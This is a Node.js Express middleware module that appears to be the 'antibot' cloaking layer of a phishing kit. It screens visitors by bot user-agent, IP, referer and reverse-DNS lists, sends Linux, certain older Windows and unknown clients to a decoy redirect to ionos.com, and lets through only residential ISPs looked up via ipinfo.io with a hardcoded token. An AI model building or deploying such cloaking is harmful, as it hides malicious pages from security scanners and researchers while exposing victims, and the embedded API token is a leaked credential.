const isbot = require('isbot');
const dns = require('dns');
const { getClientIp } = require('request-ip');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('../antibot/botUA.js');
const { botRefList } = require('../antibot/botRef.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('../antibot/botIP.js');
const botBlock = require('../antibot/botBlocker.js'); // Patterns for bot blocking
const blockedHost = require('../antibot/blockedHost.js'); // Hostname blocking list
const UAParser = require('ua-parser-js');
const residentialISPs = require("./residentialISPs");
const crawlerUserAgents = require('crawler-user-agents'); // List of known crawler patterns
const axios = require("axios");
const stringSimilarity = require("string-similarity");

const geoIpCache = {};

/**
 * Utility to check if a User-Agent belongs to a bot.
 * @param {string} userAgent
 * @returns {boolean}
 */
const isBotUA = (userAgent) => {
    if (!userAgent) return false;
    return (
        isbot(userAgent) || 
        botUAList.some((bot) => userAgent.toLowerCase().includes(bot)) || 
        botBlock.some((pattern) => new RegExp(pattern, 'i').test(userAgent)) || 
        crawlerUserAgents.some((crawler) => new RegExp(crawler.pattern, 'i').test(userAgent))
    );
};

/**
 * Utility to check if an IP address belongs to a bot.
 * @param {string} ipAddress
 * @returns {boolean}
 */
const isBotIP = (ipAddress) => {
    if (!ipAddress) return false;

    // Handle IPv4-mapped IPv6 addresses (e.g., "::ffff:192.0.2.1")
    if (ipAddress.startsWith('::ffff:')) {
        ipAddress = ipAddress.substr(7);
    }

    const IPtoNum = (ip) => ip.split('.').map((octet) => ('000' + octet).slice(-3)).join('');

    return (
        botIPList.some((botIP) => ipAddress.includes(botIP)) ||
        botIPRangeList.some(([min, max]) => 
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
        ) ||
        botIPCIDRRangeList.some((cidr) => ipRangeCheck(ipAddress, cidr)) ||
        botIPWildcardRangeList.some((pattern) => ipAddress.match(pattern))
    );
};

/**
 * Utility to check if a referer is associated with bots.
 * @param {string} referer
 * @returns {boolean}
 */
const isBotRef = (referer) => {
    if (!referer) return false;
    return botRefList.some((botRef) => referer.toLowerCase().includes(botRef));
};

/**
 * Middleware to detect and block bots.
 * @param {object} req - Express request object
 * @param {object} res - Express response object
 * @param {function} next - Express next middleware function
 */
const detectBotMiddleware = (req, res, next) => {
    const userAgent = req.headers['user-agent'] || 'Unknown User-Agent';
    const ipAddress = getClientIp(req);
    const referer = req.headers.referer || req.headers.origin || '';
    const parser = new UAParser();
    const uaResult = parser.setUA(userAgent).getResult();

    // Extract OS and browser information
    const os = uaResult.os.name || 'Unknown OS Platform';
    const browser = uaResult.browser.name || 'Unknown Browser';

    console.log(`Request Info: IP: ${ipAddress}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);

    // Check for bots based on User-Agent, IP, and referer
    if (isBotUA(userAgent) || isBotIP(ipAddress) || isBotRef(referer)) {
        console.warn(`Bot detected! IP: ${ipAddress}, User-Agent: ${userAgent}, Referer: ${referer}`);
        return res.status(403).send('Access Denied');
    }

    // Perform DNS reverse lookup
    dns.reverse(ipAddress, (err, hostnames) => {
        if (err) {
            console.error('Error resolving hostname:', err);
            return next(); // Allow the request to proceed if DNS lookup fails
        }

        // Check if the resolved hostname contains blocked words
        const isBlocked = hostnames.some((hostname) =>
            blockedHost.some((word) => hostname.toLowerCase().includes(word))
        );

        if (isBlocked) {
            console.log(`Blocked request from hostname: ${hostnames.join(', ')}`);
            return res.status(404).send('Not Found');
        }

        // Additional blocking based on OS and browser combinations
        if (
            ipAddress === '92.23.57.168' || 
            ipAddress === '96.31.1.4' || 
            ipAddress === '207.96.148.8' || 
            (os === 'Windows Server 2003/XP x64' && browser === 'Firefox') || 
            (os === 'Windows 7' && browser === 'Firefox') || 
            (os === 'Windows XP' && ['Firefox', 'Internet Explorer', 'Chrome'].includes(browser)) || 
            (os === 'Windows Vista' && browser === 'Internet Explorer') || 
            ['Windows Vista', 'Ubuntu', 'Chrome OS', 'BlackBerry', 'Linux'].includes(os) || 
            browser === 'Internet Explorer' || 
            os === 'Windows 2000' || 
            os === 'Unknown OS Platform' || 
            browser === 'Unknown Browser'
        ) {
            console.log(`Blocked: IP: ${ipAddress}, OS: ${os}, Browser: ${browser}`);
            return res.redirect('https://ionos.com');
        }

        next(); // Allow the request if no blocking conditions are met
    });
};

async function fetchGeoIpData(ipAddress) {
	
	if (geoIpCache[ipAddress]) { return geoIpCache[ipAddress]; }

const apiUrl = `https://ipinfo.io/${ipAddress}?token=12c757a2eaa663`;
try {
    const response = await axios.get(apiUrl, { timeout: 20000 });
    const data = response.data;
    geoIpCache[ipAddress] = data;
    return data;
} catch (error) {
    console.log(`[ERROR] GeoIP API request failed for IP: ${ipAddress}. Error: ${error.message}`);
    return null;
}

}

async function isAllowed(ipAddress) {
  const geoInfo = await fetchGeoIpData(ipAddress);
  if (!geoInfo) return false; // Block if API call fails

  const country = geoInfo.country || "";
  const isp = geoInfo.org || "";

  console.log(`Checking IP: ${ipAddress} | Country: ${country} | ISP: ${isp}`);

  // Find country in the ISP list
  const countryKey = Object.keys(residentialISPs).find((countryCode) =>
    residentialISPs[countryCode].countryNames.some(
      (name) => name.toLowerCase() === country.toLowerCase()
    )
  );

  if (!countryKey) {
    console.log("Blocked: Country not found in ISP database.");
    return false;
  }

  // Normalize and clean ISP names for better matching
  const normalizeString = (str) =>
    str.toLowerCase().replace(/[^a-z0-9]/g, ""); // Remove special chars

  const normalizedISP = normalizeString(isp);

  // Check if any ISP in the list matches (fuzzy search)
  const isResidentialISP = residentialISPs[countryKey].isps.some((resISP) =>
    normalizedISP.includes(normalizeString(resISP))
  );

  if (!isResidentialISP) {
    console.log("Blocked: Non-residential ISP detected");
    return false;
  }

  console.log("Allowed: Residential IP detected");
  return true;
}

module.exports = { detectBotMiddleware, fetchGeoIpData, isAllowed };
